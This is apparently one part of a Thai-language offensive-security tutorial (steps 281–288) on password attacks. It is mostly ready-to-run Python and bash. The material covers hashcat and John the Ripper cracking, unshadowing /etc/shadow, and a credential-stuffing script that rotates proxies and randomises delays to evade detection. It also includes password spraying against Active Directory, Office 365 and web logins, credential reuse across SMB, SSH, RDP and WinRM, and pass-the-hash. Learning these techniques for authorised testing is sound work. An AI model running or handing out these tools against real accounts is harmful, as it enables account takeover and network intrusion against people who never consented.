# Part 29: Password Attacks & Credential Testing (Steps 281-290)

## Step 281: Password Policy Assessment

การประเมินนโยบายรหัสผ่านเป็นขั้นตอนแรกในการทดสอบความปลอดภัยของรหัสผ่าน

```python
#!/usr/bin/env python3
# password_policy_assessor.py

import ldap3
import subprocess
import json
from datetime import datetime

class PasswordPolicyAssessor:
    def __init__(self):
        self.findings = []
    
    def assess_windows_policy_via_ldap(self, dc_ip, domain, username, password):
        """ตรวจสอบนโยบายรหัสผ่าน Windows ผ่าน LDAP"""
        try:
            server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f'{domain}\\{username}',
                password=password,
                authentication=ldap3.NTLM
            )
            conn.bind()
            
            # ค้นหา Default Domain Policy
            domain_dn = ','.join([f'DC={part}' for part in domain.split('.')])
            conn.search(
                domain_dn,
                '(objectClass=domainDNS)',
                attributes=[
                    'minPwdLength',
                    'pwdHistoryLength', 
                    'maxPwdAge',
                    'minPwdAge',
                    'pwdProperties',
                    'lockoutThreshold',
                    'lockoutDuration',
                    'lockoutObservationWindow'
                ]
            )
            
            if conn.entries:
                entry = conn.entries[0]
                policy = {
                    'min_password_length': int(entry.minPwdLength.value or 0),
                    'password_history': int(entry.pwdHistoryLength.value or 0),
                    'max_password_age_days': abs(int(entry.maxPwdAge.value or 0)) // 864000000000,
                    'min_password_age_days': abs(int(entry.minPwdAge.value or 0)) // 864000000000,
                    'complexity_enabled': bool(int(entry.pwdProperties.value or 0) & 1),
                    'lockout_threshold': int(entry.lockoutThreshold.value or 0),
                    'lockout_duration_mins': abs(int(entry.lockoutDuration.value or 0)) // 600000000,
                    'observation_window_mins': abs(int(entry.lockoutObservationWindow.value or 0)) // 600000000
                }
                return policy
        except Exception as e:
            print(f"LDAP error: {e}")
        return None
    
    def assess_linux_policy(self, target_file='/etc/pam.d/common-password'):
        """ตรวจสอบนโยบายรหัสผ่าน Linux จาก PAM configuration"""
        policy = {
            'min_length': 8,
            'min_upper': 0,
            'min_lower': 0,
            'min_digits': 0,
            'min_special': 0,
            'history': 0,
            'max_age': 99999,
            'min_age': 0,
            'warn_age': 7,
            'complexity_module': None
        }
        
        try:
            with open(target_file, 'r') as f:
                content = f.read()
            
            # Parse pam_pwquality หรือ pam_cracklib
            import re
            if 'pam_pwquality' in content:
                policy['complexity_module'] = 'pam_pwquality'
                minlen = re.search(r'minlen=([\d]+)', content)
                if minlen:
                    policy['min_length'] = int(minlen.group(1))
                ucredit = re.search(r'ucredit=-([\d]+)', content)
                if ucredit:
                    policy['min_upper'] = int(ucredit.group(1))
                lcredit = re.search(r'lcredit=-([\d]+)', content)
                if lcredit:
                    policy['min_lower'] = int(lcredit.group(1))
                dcredit = re.search(r'dcredit=-([\d]+)', content)
                if dcredit:
                    policy['min_digits'] = int(dcredit.group(1))
                ocredit = re.search(r'ocredit=-([\d]+)', content)
                if ocredit:
                    policy['min_special'] = int(ocredit.group(1))
            
            # ตรวจสอบ /etc/shadow สำหรับ age settings
            with open('/etc/login.defs', 'r') as f:
                logindefs = f.read()
            max_days = re.search(r'PASS_MAX_DAYS\s+([\d]+)', logindefs)
            if max_days:
                policy['max_age'] = int(max_days.group(1))
            min_days = re.search(r'PASS_MIN_DAYS\s+([\d]+)', logindefs)
            if min_days:
                policy['min_age'] = int(min_days.group(1))
        except Exception as e:
            print(f"Error reading policy: {e}")
        
        return policy
    
    def analyze_policy_weaknesses(self, policy):
        """วิเคราะห์ช่องโหว่ในนโยบายรหัสผ่าน"""
        weaknesses = []
        
        if policy.get('min_password_length', 0) < 12:
            weaknesses.append({
                'issue': 'Minimum password length too short',
                'current': policy.get('min_password_length', 0),
                'recommended': 12,
                'severity': 'HIGH'
            })
        
        if not policy.get('complexity_enabled', False):
            weaknesses.append({
                'issue': 'Password complexity not enforced',
                'severity': 'HIGH'
            })
        
        if policy.get('lockout_threshold', 0) == 0:
            weaknesses.append({
                'issue': 'No account lockout threshold - brute force possible',
                'severity': 'CRITICAL'
            })
        elif policy.get('lockout_threshold', 0) > 10:
            weaknesses.append({
                'issue': 'Account lockout threshold too high',
                'current': policy.get('lockout_threshold'),
                'recommended': 5,
                'severity': 'MEDIUM'
            })
        
        if policy.get('max_password_age_days', 0) > 90:
            weaknesses.append({
                'issue': 'Password expiry too long',
                'current': policy.get('max_password_age_days'),
                'recommended': 90,
                'severity': 'MEDIUM'
            })
        
        if policy.get('password_history', 0) < 12:
            weaknesses.append({
                'issue': 'Password history too short - allows password reuse',
                'current': policy.get('password_history', 0),
                'recommended': 24,
                'severity': 'MEDIUM'
            })
        
        return weaknesses

# ตัวอย่างการใช้งาน
assessor = PasswordPolicyAssessor()
policy = assessor.assess_windows_policy_via_ldap(
    dc_ip='192.168.1.10',
    domain='corp.local',
    username='testuser',
    password='Password123!'
)
if policy:
    weaknesses = assessor.analyze_policy_weaknesses(policy)
    for w in weaknesses:
        print(f"[{w['severity']}] {w['issue']}")
```

## Step 282: Wordlist Generation & Customization

การสร้าง wordlist ที่เหมาะกับเป้าหมายเพิ่มโอกาสสำเร็จในการโจมตีรหัสผ่าน

```python
#!/usr/bin/env python3
# wordlist_generator.py

import itertools
import hashlib
from typing import List, Set

class WordlistGenerator:
    def __init__(self):
        self.leet_speak = {
            'a': ['@', '4'],
            'e': ['3'],
            'i': ['1', '!'],
            'o': ['0'],
            's': ['$', '5'],
            't': ['7'],
            'b': ['8']
        }
        self.common_suffixes = [
            '123', '1234', '12345', '123456',
            '!', '!!', '@', '#', '$',
            '2023', '2024', '2025',
            '01', '99', '00',
            'pass', 'pwd', '1',
        ]
        self.common_prefixes = [
            'Pass', 'pass', 'P@ss',
            'Admin', 'admin', ''
        ]
    
    def generate_target_wordlist(self, company_name: str, keywords: List[str]):
        """สร้าง wordlist จากข้อมูลบริษัท"""
        words = set()
        base_words = [company_name] + keywords
        
        for word in base_words:
            # เพิ่ม variations พื้นฐาน
            words.add(word)
            words.add(word.lower())
            words.add(word.upper())
            words.add(word.capitalize())
            
            # เพิ่ม suffix
            for suffix in self.common_suffixes:
                words.add(f"{word}{suffix}")
                words.add(f"{word.capitalize()}{suffix}")
            
            # เพิ่ม prefix
            for prefix in self.common_prefixes:
                if prefix:
                    words.add(f"{prefix}{word}")
                    words.add(f"{prefix}{word.capitalize()}")
            
            # Leet speak variations
            leet_words = self._generate_leet(word.lower())
            words.update(leet_words)
        
        return sorted(words)
    
    def _generate_leet(self, word: str) -> Set[str]:
        """สร้าง leet speak variations"""
        results = {word}
        for char, replacements in self.leet_speak.items():
            if char in word:
                new_results = set()
                for w in results:
                    new_results.add(w)
                    for replacement in replacements:
                        new_results.add(w.replace(char, replacement, 1))
                results = new_results
        return results
    
    def generate_date_passwords(self, start_year: int = 1990, end_year: int = 2025):
        """สร้าง wordlist จากวันที่"""
        words = []
        for year in range(start_year, end_year + 1):
            for month in range(1, 13):
                for day in [1, 15, 28, 31]:
                    words.extend([
                        f"{year}{month:02d}{day:02d}",
                        f"{day:02d}{month:02d}{year}",
                        f"{month:02d}/{day:02d}/{year}",
                        f"{year}-{month:02d}-{day:02d}",
                    ])
        return words
    
    def generate_hybrid_wordlist(self, base_wordlist_file: str, rules_file: str = None):
        """สร้าง hybrid wordlist โดยใช้ base wordlist + mutations"""
        import subprocess
        # ใช้ hashcat เพื่อ apply rules
        if rules_file:
            cmd = f"hashcat --stdout {base_wordlist_file} -r {rules_file}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.split('\n')
        return []
    
    def generate_crunch_wordlist(self, min_len: int, max_len: int, charset: str, output_file: str):
        """ใช้ crunch เพื่อสร้าง wordlist แบบ brute force"""
        import subprocess
        cmd = f"crunch {min_len} {max_len} '{charset}' -o {output_file}"
        print(f"Running: {cmd}")
        # subprocess.run(cmd, shell=True)
        print(f"Wordlist saved to {output_file}")
    
    def generate_cewl_wordlist(self, target_url: str, depth: int = 2, min_word_length: int = 6):
        """ใช้ CeWL scrape words จาก target website"""
        import subprocess
        cmd = f"cewl {target_url} -d {depth} -m {min_word_length} --email -w /tmp/cewl_wordlist.txt"
        print(f"Running: {cmd}")
        # subprocess.run(cmd, shell=True)
        return "/tmp/cewl_wordlist.txt"
    
    def save_wordlist(self, words: List[str], output_file: str):
        """บันทึก wordlist ลงไฟล์"""
        unique_words = sorted(set(words))
        with open(output_file, 'w') as f:
            f.write('\n'.join(unique_words))
        print(f"Saved {len(unique_words)} words to {output_file}")
        return len(unique_words)

# ตัวอย่างการใช้งาน
generator = WordlistGenerator()
keywords = ['acmecorp', 'acme', 'company', 'support', 'helpdesk', 'it', 'admin']
wordlist = generator.generate_target_wordlist('AcmeCorp', keywords)
print(f"Generated {len(wordlist)} words")
print("Sample words:")
for word in list(wordlist)[:10]:
    print(f"  {word}")
```

## Step 283: Hashcat Advanced Techniques

```bash
#!/bin/bash
# hashcat_advanced.sh

# ============================================
# Hashcat Attack Types Reference
# ============================================

# Hash Types ที่ใช้บ่อย:
# -m 0    = MD5
# -m 100  = SHA1
# -m 1400 = SHA256
# -m 1800 = SHA512crypt (Linux shadow)
# -m 500  = MD5crypt (Apache/PHP)
# -m 1000 = NTLM
# -m 5600 = NetNTLMv2
# -m 13100 = Kerberoast (TGS-REP)
# -m 18200 = AS-REP Roast
# -m 22000 = WPA-PBKDF2-PMKID+EAPOL
# -m 3000 = LM hash
# -m 7500 = Kerberos 5 AS-REQ Pre-Auth

# Attack Modes:
# -a 0 = Dictionary Attack
# -a 1 = Combination Attack
# -a 3 = Brute-Force/Mask Attack
# -a 6 = Hybrid Wordlist + Mask
# -a 7 = Hybrid Mask + Wordlist

HASHFILE="/tmp/hashes.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"
RULES_DIR="/usr/share/hashcat/rules"

# ============================================
# Dictionary Attack พื้นฐาน
# ============================================
hashcat -m 1000 $HASHFILE $WORDLIST -o cracked.txt --force

# ============================================
# Dictionary + Rules (Best64)
# ============================================
hashcat -m 1000 $HASHFILE $WORDLIST \
    -r $RULES_DIR/best64.rule \
    -o cracked.txt --force

# ============================================
# Dictionary + Multiple Rules
# ============================================
hashcat -m 1000 $HASHFILE $WORDLIST \
    -r $RULES_DIR/best64.rule \
    -r $RULES_DIR/d3ad0ne.rule \
    -o cracked.txt --force

# ============================================
# Mask Attack - 8 chars uppercase+lowercase+digit
# ============================================
# ?l = lowercase, ?u = uppercase, ?d = digit
# ?s = special, ?a = all printable, ?h = hex lowercase
hashcat -m 1000 $HASHFILE -a 3 '?u?l?l?l?l?l?d?d' --force

# ============================================
# Mask Attack - Common Password Patterns
# ============================================
# Pattern: Capital + 5 lower + 2 digits
hashcat -m 1000 $HASHFILE -a 3 '?u?l?l?l?l?l?d?d' --force

# Pattern: Word + Year
hashcat -m 1000 $HASHFILE -a 3 -1 'PpAaDdMm' '?1?1?1?1?d?d?d?d' --force

# ============================================
# Hybrid Attack - Wordlist + Mask
# ============================================
# Wordlist word followed by 2 digits
hashcat -m 1000 $HASHFILE -a 6 $WORDLIST '?d?d' --force

# Wordlist word followed by special char
hashcat -m 1000 $HASHFILE -a 6 $WORDLIST '?s' --force

# ============================================
# Combination Attack
# ============================================
hashcat -m 1000 $HASHFILE -a 1 /tmp/first_names.txt /tmp/months.txt --force

# ============================================
# Kerberoast Hash Cracking
# ============================================
hashcat -m 13100 /tmp/kerberoast_hashes.txt $WORDLIST \
    -r $RULES_DIR/best64.rule \
    -o cracked_kerberoast.txt --force

# ============================================
# AS-REP Roast
# ============================================
hashcat -m 18200 /tmp/asrep_hashes.txt $WORDLIST \
    -r $RULES_DIR/best64.rule \
    -o cracked_asrep.txt --force

# ============================================
# NetNTLMv2 (Responder captures)
# ============================================
hashcat -m 5600 /tmp/ntlmv2_hashes.txt $WORDLIST \
    -r $RULES_DIR/best64.rule \
    -o cracked_ntlmv2.txt --force

# ============================================
# WPA2 WiFi
# ============================================
hashcat -m 22000 /tmp/wifi.hccapx $WORDLIST \
    -r $RULES_DIR/best64.rule \
    -o cracked_wifi.txt --force

# ============================================
# Custom Rule Creation
# ============================================
cat << 'EOF' > /tmp/custom_rules.rule
# l = lowercase, u = uppercase, c = capitalize
# Append numbers
$1 $2 $3
$! $@ $#
# Replace a with @
sa@
# Append year
$2$0$2$4
$2$0$2$5
# Toggle case first char
t0
# Reverse word
r
# Duplicate word
d
EOF

hashcat -m 1000 $HASHFILE $WORDLIST -r /tmp/custom_rules.rule --force

# ============================================
# Performance Tuning
# ============================================
# -w 3 = high workload profile
# --opencl-device-types 1 = CPU only, 2 = GPU
hashcat -m 1000 $HASHFILE $WORDLIST \
    -r $RULES_DIR/best64.rule \
    -w 3 \
    --opencl-device-types 2 \
    -o cracked.txt --force

# Show cracked passwords
hashcat -m 1000 $HASHFILE --show

echo "[+] Hashcat attacks completed"
```

## Step 284: John the Ripper Advanced Usage

```bash
#!/bin/bash
# john_advanced.sh

HASHFILE="/tmp/hashes.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# ============================================
# John the Ripper - Basic Usage
# ============================================

# Auto-detect hash format
john $HASHFILE

# Specify format
john --format=NT $HASHFILE
john --format=sha512crypt $HASHFILE
john --format=bcrypt $HASHFILE

# ============================================
# Dictionary Attack
# ============================================
john --wordlist=$WORDLIST $HASHFILE
john --wordlist=$WORDLIST --format=NT $HASHFILE

# ============================================
# Rules-based Attack
# ============================================
john --wordlist=$WORDLIST --rules $HASHFILE
john --wordlist=$WORDLIST --rules=Jumbo $HASHFILE
john --wordlist=$WORDLIST --rules=KoreLogic $HASHFILE

# ============================================
# Brute Force (Incremental)
# ============================================
john --incremental $HASHFILE
john --incremental=Digits $HASHFILE
john --incremental=Alpha $HASHFILE
john --incremental=Alnum $HASHFILE

# ============================================
# Linux Shadow File
# ============================================
# Unshadow จาก /etc/passwd และ /etc/shadow
unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt
john /tmp/unshadowed.txt --wordlist=$WORDLIST --rules

# ============================================
# Windows Hashes
# ============================================
# Crack NTLM hashes
john --format=NT /tmp/ntlm_hashes.txt --wordlist=$WORDLIST

# LM hashes (เก่า)
john --format=LM /tmp/lm_hashes.txt

# ============================================
# ZIP/RAR Password Cracking
# ============================================
zip2john /tmp/protected.zip > /tmp/zip_hash.txt
john /tmp/zip_hash.txt --wordlist=$WORDLIST

rar2john /tmp/protected.rar > /tmp/rar_hash.txt
john /tmp/rar_hash.txt --wordlist=$WORDLIST

# ============================================
# SSH Private Key
# ============================================
ssh2john /tmp/id_rsa_protected > /tmp/ssh_hash.txt
john /tmp/ssh_hash.txt --wordlist=$WORDLIST

# ============================================
# PDF Password
# ============================================
pdf2john /tmp/protected.pdf > /tmp/pdf_hash.txt
john /tmp/pdf_hash.txt --wordlist=$WORDLIST

# ============================================
# Kerberoast
# ============================================
john --format=krb5tgs /tmp/kerberoast.txt --wordlist=$WORDLIST

# ============================================
# Show Results
# ============================================
john --show $HASHFILE
john --show --format=NT /tmp/ntlm_hashes.txt

# ============================================
# Session Management
# ============================================
john --session=mysession $HASHFILE --wordlist=$WORDLIST
john --restore=mysession  # Resume after interruption

echo "[+] John the Ripper attacks completed"
```

## Step 285: Credential Stuffing Automation

```python
#!/usr/bin/env python3
# credential_stuffer.py

import requests
import json
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Dict

class CredentialStuffer:
    def __init__(self, target_url: str, success_indicator: str):
        self.target_url = target_url
        self.success_indicator = success_indicator
        self.valid_creds = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        ]
    
    def load_credentials(self, cred_file: str) -> List[Tuple[str, str]]:
        """โหลด credentials จากไฟล์ (format: user:password)"""
        credentials = []
        with open(cred_file, 'r', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    credentials.append((parts[0], parts[1]))
        return credentials
    
    def test_credential(self, username: str, password: str, proxy: Dict = None) -> bool:
        """ทดสอบ credential เดียว"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        payload = {
            'username': username,
            'password': password
        }
        
        try:
            response = requests.post(
                self.target_url,
                json=payload,
                headers=headers,
                proxies=proxy,
                timeout=10,
                allow_redirects=True
            )
            
            # ตรวจสอบผลลัพธ์
            if self.success_indicator in response.text:
                return True
            if response.status_code == 200 and 'token' in response.text:
                return True
            if response.status_code == 302:  # Redirect after login
                location = response.headers.get('Location', '')
                if 'dashboard' in location or 'home' in location:
                    return True
        except requests.exceptions.RequestException:
            pass
        
        return False
    
    def run_stuffing_campaign(
        self, 
        cred_file: str,
        delay_min: float = 0.5,
        delay_max: float = 2.0,
        max_workers: int = 5,
        proxy_list: List[str] = None
    ):
        """รัน credential stuffing campaign"""
        credentials = self.load_credentials(cred_file)
        print(f"[*] Loaded {len(credentials)} credential pairs")
        print(f"[*] Target: {self.target_url}")
        
        proxy_index = 0
        
        for i, (username, password) in enumerate(credentials):
            # Rotate proxies
            proxy = None
            if proxy_list:
                proxy_url = proxy_list[proxy_index % len(proxy_list)]
                proxy = {'http': proxy_url, 'https': proxy_url}
                proxy_index += 1
            
            # Random delay เพื่อหลีกเลี่ยงการตรวจจับ
            time.sleep(random.uniform(delay_min, delay_max))
            
            if self.test_credential(username, password, proxy):
                print(f"[+] VALID: {username}:{password}")
                self.valid_creds.append({
                    'username': username,
                    'password': password,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                })
            else:
                print(f"[-] Invalid: {username}:{password[:3]}***")
            
            # Progress
            if (i + 1) % 100 == 0:
                print(f"[*] Progress: {i+1}/{len(credentials)} ({len(self.valid_creds)} valid)")
        
        return self.valid_creds
    
    def generate_report(self, output_file: str = 'stuffing_report.json'):
        """สร้างรายงานผลลัพธ์"""
        report = {
            'target': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'valid_credentials': self.valid_creds,
            'total_valid': len(self.valid_creds)
        }
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Report saved to {output_file}")

# ตัวอย่างการใช้งาน
stuffer = CredentialStuffer(
    target_url='https://target.example.com/api/auth/login',
    success_indicator='"success":true'
)
# stuffer.run_stuffing_campaign('credentials.txt')
```

## Step 286: Password Spraying Techniques

```python
#!/usr/bin/env python3
# password_sprayer.py

import ldap3
import requests
import time
import json
from typing import List, Dict

class PasswordSprayer:
    def __init__(self):
        self.valid_creds = []
        self.locked_accounts = []
    
    def spray_ldap(
        self,
        dc_ip: str,
        domain: str,
        usernames: List[str],
        passwords: List[str],
        delay_between_rounds: int = 1800  # 30 minutes
    ):
        """Password spray ผ่าน LDAP (Active Directory)"""
        print(f"[*] Starting LDAP password spray against {dc_ip}")
        print(f"[*] {len(usernames)} users, {len(passwords)} passwords")
        print(f"[*] Delay between rounds: {delay_between_rounds}s")
        
        for round_num, password in enumerate(passwords):
            print(f"\n[*] Round {round_num+1}: Testing password '{password}'")
            
            for username in usernames:
                try:
                    server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
                    conn = ldap3.Connection(
                        server,
                        user=f'{domain}\\{username}',
                        password=password,
                        authentication=ldap3.NTLM,
                        receive_timeout=5
                    )
                    result = conn.bind()
                    
                    if result:
                        print(f"[+] VALID: {username}:{password}")
                        self.valid_creds.append({'user': username, 'pass': password})
                    else:
                        # ตรวจสอบ error code
                        error = conn.last_error
                        if '775' in str(error) or 'locked' in str(error.lower() if error else ''):
                            print(f"[!] LOCKED: {username}")
                            self.locked_accounts.append(username)
                
                except Exception as e:
                    if 'locked' in str(e).lower():
                        self.locked_accounts.append(username)
                
                time.sleep(0.5)  # Small delay between users
            
            if round_num < len(passwords) - 1:
                print(f"[*] Waiting {delay_between_rounds}s before next round...")
                time.sleep(delay_between_rounds)
        
        return self.valid_creds
    
    def spray_office365(
        self,
        usernames: List[str],
        passwords: List[str],
        delay_between_rounds: int = 1800
    ):
        """Password spray ผ่าน Office 365"""
        url = 'https://login.microsoftonline.com/common/oauth2/token'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        
        for password in passwords:
            print(f"[*] Testing password: {password}")
            for username in usernames:
                data = {
                    'grant_type': 'password',
                    'username': username,
                    'password': password,
                    'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',  # Azure PowerShell client ID
                    'scope': 'openid',
                    'resource': 'https://graph.microsoft.com'
                }
                
                try:
                    response = requests.post(url, data=data, headers=headers, timeout=10)
                    result = response.json()
                    
                    if 'access_token' in result:
                        print(f"[+] VALID: {username}:{password}")
                        self.valid_creds.append({'user': username, 'pass': password})
                    elif result.get('error') == 'AADSTS50126':
                        pass  # Invalid password
                    elif result.get('error') == 'AADSTS50057':
                        print(f"[!] Disabled account: {username}")
                    elif result.get('error') == 'AADSTS50053':
                        print(f"[!] LOCKED: {username}")
                    elif result.get('error') == 'AADSTS50055':
                        print(f"[+] VALID (expired password): {username}:{password}")
                        self.valid_creds.append({'user': username, 'pass': password, 'expired': True})
                
                except Exception as e:
                    pass
                
                time.sleep(1)
            
            time.sleep(delay_between_rounds)
        
        return self.valid_creds
    
    def spray_web_login(
        self,
        login_url: str,
        usernames: List[str],
        passwords: List[str],
        user_field: str,
        pass_field: str,
        success_indicator: str
    ):
        """Password spray บน web login form"""
        for password in passwords:
            print(f"[*] Spraying password: {password}")
            for username in usernames:
                data = {
                    user_field: username,
                    pass_field: password
                }
                try:
                    r = requests.post(login_url, data=data, timeout=10)
                    if success_indicator in r.text:
                        print(f"[+] VALID: {username}:{password}")
                        self.valid_creds.append({'user': username, 'pass': password})
                except:
                    pass
                time.sleep(0.3)
            time.sleep(30)  # ช่วยหลีกเลี่ยง rate limiting
        return self.valid_creds
    
    def get_common_passwords(self) -> List[str]:
        """รายการรหัสผ่านทั่วไปสำหรับ spraying"""
        return [
            'Password1', 'Password123', 'Welcome1',
            'Summer2024', 'Winter2024', 'Spring2024', 'Fall2024',
            'January2024', 'February2024',
            'Company@2024', 'Company123!',
            'P@ssw0rd', 'P@ssword1',
            'Passw0rd!', 'Admin@123',
            'Monday1', 'Monday123',
        ]

# ตัวอย่างการใช้งาน
sprayer = PasswordSprayer()
users = ['alice', 'bob', 'charlie', 'david']
passwords = sprayer.get_common_passwords()[:3]  # Test only first 3
print(f"[*] Spray targets: {len(users)} users, {len(passwords)} passwords")
```

## Step 287: Hash Cracking with Rainbow Tables

```python
#!/usr/bin/env python3
# rainbow_table_tools.py

import hashlib
import os
import struct
from typing import Optional, List

class RainbowTableTool:
    def __init__(self):
        self.charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    
    def hash_md5(self, plaintext: str) -> str:
        return hashlib.md5(plaintext.encode()).hexdigest()
    
    def hash_sha1(self, plaintext: str) -> str:
        return hashlib.sha1(plaintext.encode()).hexdigest()
    
    def hash_ntlm(self, plaintext: str) -> str:
        """สร้าง NTLM hash"""
        return hashlib.new('md4', plaintext.encode('utf-16le')).hexdigest()
    
    def reduce_function(self, hash_value: str, step: int, max_length: int = 6) -> str:
        """Reduction function สำหรับ rainbow table"""
        # แปลง hash เป็น index
        hash_int = int(hash_value[:8], 16) + step
        result = ''
        charset_len = len(self.charset)
        for _ in range(max_length):
            result += self.charset[hash_int % charset_len]
            hash_int //= charset_len
        return result
    
    def generate_chain(self, start_plaintext: str, chain_length: int, hash_func) -> tuple:
        """สร้าง hash chain"""
        current = start_plaintext
        for step in range(chain_length):
            hashed = hash_func(current)
            current = self.reduce_function(hashed, step)
        return start_plaintext, current  # (start, end)
    
    def build_simple_rainbow_table(
        self,
        num_chains: int = 1000,
        chain_length: int = 100,
        hash_func = None
    ) -> dict:
        """สร้าง rainbow table ขนาดเล็กสำหรับการสาธิต"""
        if hash_func is None:
            hash_func = self.hash_md5
        
        table = {}
        import random
        
        for i in range(num_chains):
            # สร้าง random start point
            start = ''.join(random.choices(self.charset, k=6))
            start_pt, end_pt = self.generate_chain(start, chain_length, hash_func)
            table[end_pt] = start_pt
        
        print(f"[+] Built rainbow table with {len(table)} chains")
        return table
    
    def lookup_hash(self, target_hash: str, table: dict, chain_length: int, hash_func = None) -> Optional[str]:
        """ค้นหา plaintext จาก hash ใน rainbow table"""
        if hash_func is None:
            hash_func = self.hash_md5
        
        for step in range(chain_length - 1, -1, -1):
            # Reduce hash at this step
            reduced = self.reduce_function(target_hash, step)
            current = reduced
            
            # Walk forward to end of chain
            for s in range(step + 1, chain_length):
                hashed = hash_func(current)
                current = self.reduce_function(hashed, s)
            
            # Check if end point is in table
            if current in table:
                # Regenerate chain to find plaintext
                start = table[current]
                current = start
                for s in range(chain_length):
                    hashed = hash_func(current)
                    if hashed == target_hash:
                        return current  # Found!
                    current = self.reduce_function(hashed, s)
        
        return None  # Not found

class OphcrackUsage:
    """การใช้ Ophcrack และ RainbowCrack"""
    
    def get_ophcrack_commands(self) -> dict:
        return {
            'install': 'apt install ophcrack',
            'download_tables': 'Download from https://ophcrack.sourceforge.io/tables.php',
            'crack_ntlm': 'ophcrack -t /opt/rainbow_tables/xp_free_fast -f /tmp/ntlm_hashes.txt',
            'crack_lm': 'ophcrack -t /opt/rainbow_tables/xp_special -f /tmp/lm_hashes.txt',
        }
    
    def get_rainbowcrack_commands(self) -> dict:
        return {
            'generate_table': 'rtgen md5 loweralpha-numeric 1 7 0 3800 33554432 0',
            'sort_table': 'rtsort *.rt',
            'crack': 'rcrack . -h 098f6bcd4621d373cade4e832627b4f6',
            'crack_file': 'rcrack . -l /tmp/hashes.txt',
        }

# Demo
tool = RainbowTableTool()
target = 'hello'
hash_val = tool.hash_md5(target)
print(f"[*] MD5('{target}') = {hash_val}")
print("[*] Rainbow tables work by precomputing hash chains")
print("[*] Real tools: ophcrack, rcracki, hashcat with potfile")
```

## Step 288: Credential Reuse & Lateral Movement

```python
#!/usr/bin/env python3
# credential_reuse_tester.py

import subprocess
import socket
import concurrent.futures
from typing import List, Dict, Tuple

class CredentialReuseTester:
    def __init__(self):
        self.valid_targets = []
    
    def test_smb(self, ip: str, username: str, password: str, domain: str = '.') -> bool:
        """ทดสอบ credential บน SMB"""
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(ip, ip, timeout=5)
            conn.login(username, password, domain)
            conn.logoff()
            return True
        except Exception:
            return False
    
    def test_rdp(self, ip: str, username: str, password: str) -> bool:
        """ทดสอบ credential บน RDP (ใช้ ncrack หรือ xfreerdp)"""
        try:
            result = subprocess.run(
                ['xfreerdp', f'/v:{ip}', f'/u:{username}', f'/p:{password}',
                 '/cert-ignore', '+auth-only', '/timeout:5000'],
                capture_output=True, timeout=10
            )
            return 'Authentication only, exit status 0' in result.stdout.decode() \
                   or result.returncode == 0
        except:
            return False
    
    def test_ssh(self, ip: str, username: str, password: str, port: int = 22) -> bool:
        """ทดสอบ credential บน SSH"""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password, timeout=5)
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except:
            return False
    
    def test_winrm(self, ip: str, username: str, password: str) -> bool:
        """ทดสอบ credential บน WinRM"""
        try:
            import pywinrm
            session = pywinrm.Session(
                target=f'http://{ip}:5985/wsman',
                auth=(username, password),
                transport='ntlm'
            )
            result = session.run_cmd('whoami')
            return result.status_code == 0
        except:
            return False
    
    def test_mssql(self, ip: str, username: str, password: str, port: int = 1433) -> bool:
        """ทดสอบ credential บน MSSQL"""
        try:
            import pymssql
            conn = pymssql.connect(ip, username, password, 'master', port=port, timeout=5)
            conn.close()
            return True
        except:
            return False
    
    def run_reuse_campaign(
        self,
        targets: List[str],
        credentials: List[Tuple[str, str]],
        services: List[str] = ['smb', 'ssh', 'rdp'],
        workers: int = 10
    ):
        """รัน credential reuse ทดสอบหลาย targets"""
        print(f"[*] Testing {len(credentials)} creds against {len(targets)} targets")
        results = []
        
        for target in targets:
            for username, password in credentials:
                for service in services:
                    success = False
                    if service == 'smb':
                        success = self.test_smb(target, username, password)
                    elif service == 'ssh':
                        success = self.test_ssh(target, username, password)
                    elif service == 'rdp':
                        success = self.test_rdp(target, username, password)
                    
                    if success:
                        result = {
                            'target': target,
                            'service': service,
                            'username': username,
                            'password': password
                        }
                        results.append(result)
                        print(f"[+] VALID {service.upper()}: {username}:{password} @ {target}")
        
        return results
    
    def spray_with_cme(
        self,
        targets: str,
        username: str,
        password: str,
        domain: str = None
    ):
        """ใช้ CrackMapExec สำหรับ network-wide testing"""
        # SMB
        smb_cmd = f"crackmapexec smb {targets}"
        if domain:
            smb_cmd += f" -d {domain}"
        smb_cmd += f" -u '{username}' -p '{password}'"
        print(f"[*] Running: {smb_cmd}")
        
        # WinRM
        winrm_cmd = f"crackmapexec winrm {targets} -u '{username}' -p '{password}'"
        print(f"[*] Running: {winrm_cmd}")
        
        # SSH
        ssh_cmd = f"crackmapexec ssh {targets} -u '{username}' -p '{password}'"
        print(f"[*] Running: {ssh_cmd}")
        
        return smb_cmd, winrm_cmd, ssh_cmd

# CrackMapExec Examples
print("=== CrackMapExec Usage ===")
print("# Test SMB with credentials")
print("crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123!'")
print("")
print("# Pass-the-Hash")
print("crackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86'")
print("")
